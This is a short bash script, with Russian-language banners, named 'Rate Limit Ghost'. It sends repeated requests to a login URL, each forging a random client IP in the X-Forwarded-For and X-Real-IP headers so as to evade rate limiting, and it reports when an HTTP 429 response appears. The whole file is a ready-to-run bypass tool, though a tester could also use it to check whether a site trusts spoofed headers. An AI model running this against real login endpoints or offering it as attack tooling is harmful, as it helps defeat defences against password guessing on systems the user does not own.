#!/bin/bash
# ╔══════════════════════════════════════════════╗
# ║   🔴 RATE LIMIT GHOST — Обход rate-limit    ║
# ╚══════════════════════════════════════════════╝
TARGET=${1:-"https://target.com/login"}
echo "╔══════════════════════════════════════════════╗"
echo "║   👻 RATE LIMIT GHOST — Обход rate-limit    ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

for i in $(seq 1 15); do
    IP="$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"
    code=$(curl -sk --max-time 3 -H "X-Forwarded-For: $IP" -H "X-Real-IP: $IP" "$TARGET?attempt=$i" -o /dev/null -w "%{http_code}" 2>/dev/null)
    echo "  Запрос #$i (IP: $IP): HTTP $code"
    [ "$code" = "429" ] && echo "  🚫 Rate-limit сработал на запросе #$i!" && break
    sleep 0.3
done
echo "[RATE] ✅ Проверка завершена"
